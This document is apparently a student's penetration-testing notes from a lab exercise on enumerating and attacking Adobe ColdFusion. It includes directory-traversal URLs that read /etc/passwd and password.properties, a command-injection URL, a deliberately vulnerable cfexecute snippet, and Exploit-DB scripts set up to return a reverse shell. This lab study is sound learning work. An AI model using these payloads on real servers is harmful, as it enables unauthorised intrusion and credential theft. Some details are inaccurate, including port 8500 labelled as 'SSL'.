## 1-ColdFusion - Discovery & Enumeration
### ColdFusion – Discovery & Enumeration (Short Notes)

- **ColdFusion**: Java-based web app platform by **Adobe**
- **Language**: CFML (tag-based, HTML-like)
- **Uses**: Dynamic web apps, APIs, DB integration (MySQL, MSSQL, Oracle)
- **Key CFML tags**:
    - `<cfquery>` → execute SQL  .an  example connect to db
```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>

```
 - `<cfloop>` → iterate results
```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```
- **Features**:
    - Email, PDF, graphs, AJAX, session handling
    - Supports Java & JavaScript
- **Deployment**:
    - Runs on Windows / Linux / macOS
    - Supports cloud (AWS, Azure)
- **Benefits**:
    - Rapid development
    - Easy DB integration
    - Good performance & scalability
- **Versions**:
    - Latest: **CF 2021**
    - Others: 2018, 2016, 11

- **Common Vulnerabilities**:
 1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

- **Default Ports:**
    - 80 / 443 → HTTP / HTTPS
    - 8500 → SSL
    - 5500 → Server Monitor (admin)
    - 1935 → RPC
    - 25 → SMTP
#### Enumeration
During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion. Here are some methods that can be used:
- **Ports**: 80, 443 (detectable via Nmap)
- **Extensions**: `.cfm`, `.cfc`
- **Headers**: `Server` / `X-Powered-By: ColdFusion`
- **Errors**: CFML tags in messages
- **Default Files**: `/admin.cfm`, `/CFIDE/administrator/`
##### NMap ports and service scan results
```bash
nmap -p- -sC -Pn 10.129.247.30 --open 
 # 135/tcp   open  msrpc
 # 8500/tcp  open  fmtp
 # 49154/tcp open  unknown
```
**Open Port**: **8500** (ColdFusion SSL)

Navigating to the `IP:8500` lists 2 directories, `CFIDE` and `cfdocs,` in the root, further indicating that ColdFusion is running on port 8500.
![[Pasted image 20251223193058.png]]
- **Conclusion**: ColdFusion running on port **8500**

Navigating around the structure a bit shows lots of interesting info, from files with a clear `.cfm` extension to error messages and login pages.
![[Pasted image 20251223193130.png]]
The `/CFIDE/administrator` path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.
![[Pasted image 20251223193149.png]]


---
## Attacking ColdFusion
**Identified Version**: ColdFusion **8**, let Search for known public exploits
`searchsploit:`  Searches Exploit-DB locally
```bash
searchsploit adobe coldfusion
  # Adobe ColdFusion - Directory Traversal  | multiple/remote/14641.py
  # Adobe ColdFusion 8 - Remote Command Execution (RCE)  | cfm/webapps/50057.py
```
**Results**: 
  - **Directory Traversal**
  - **Remote Command Execution (RCE)**
#### Directory Traversal
Directory / Path Traversal : Read arbitrary files outside web root (configs, creds, system files)
- **Cause**: Poor input validation in CFML file-handling tags `CFDIRECTORY`, `CFFILE`
- **Traversal Payload**:`../` sequences to escape directories
**example:**
```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```
`cfdirectory` lists files from `uploads/`
No validation on`directory` parameter → traversal possible
```bash
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```


`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks in `Adobe ColdFusion 9.0.1` and `earlier versions` by manipulating the `locale parameter (?locale=en)` in these specific ColdFusion files.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`
example:
```bash
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```
**exploit:** 
```bash
searchsploit Adobe ColdFusion  
  # Adobe ColdFusion - Directory Traversal - multiple/remote/14641.py
searchsploit -m multiple/remote/14641.py  
python2 14641.py 
  # usage: 14641.py <host> <port> <file_path>
```
**password.properties** in `ColdFusion8/lib/password.properties` : Stores **encrypted credentials** for: Databases,  Mail servers ,  LDAP, The file is usually in the `[cf_root]/lib` directory
##### Coldfusion - Exploitation
```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
As we can see, the contents of the `password.properties` file have been retrieved, proving that this target is vulnerable to `CVE-2010-2861`.
#### Unauthenticated RCE
unauthenticated Remote Code Execution , execute arbitrary commands **without login**, let to Full system compromise
**example:** 
```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```
- User input (`cgi.query_string`) is executed directly via `cfexecute` without validation
- No authentication required → attacker can execute arbitrary system commands
exploit example:
```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

**exploit:** 
```bash
searchsploit Adobe ColdFusion  
  # Adobe ColdFusion 8 - Remote Command Execution (RCE) cfm/webapps/50057.py
searchsploit -m cfm/webapps/50057.py
```
**Exploit Modification**
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```
##### Exploitation
```bash
python3 50057.py 
  # get reverse shell 
```


